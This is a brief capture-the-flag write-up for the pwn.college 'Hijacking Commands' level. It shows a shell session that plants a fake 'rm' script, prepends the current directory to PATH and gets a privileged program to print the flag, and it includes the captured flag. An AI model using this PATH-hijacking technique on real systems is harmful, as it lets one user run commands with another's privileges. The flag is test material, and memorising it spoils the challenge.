# **PONDERING PATH**
## **<ins>HIJACKING COMMANDS</ins>**

With the help of learnings from previous challenges we find the flag.

### SOLVE: 
***FLAG:*** pwn.college{0Y7xl2ugxjgre9qfv3ByiiEwVrY.QX3cjM1wSO2kjNzEzW}

I made a shell script for rm and gave permissions to the user. I then added its path to the current directory.
Then on running /challenge/run I obtained the flag.

```
hacker@path~hijacking-commands:~$ echo "cat /flag" > rm
hacker@path~hijacking-commands:~$ chmod ugo+x rm
hacker@path~hijacking-commands:~$ export PATH="$(pwd):$PATH"
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/rm. Executing!
pwn.college{0Y7xl2ugxjgre9qfv3ByiiEwVrY.QX3cjM1wSO2kjNzEzW}
```

### WHAT I LEARNED:
I learnt how to find the flag with various commands using rm and the PATH variable.

### REFERENCES:
None. 
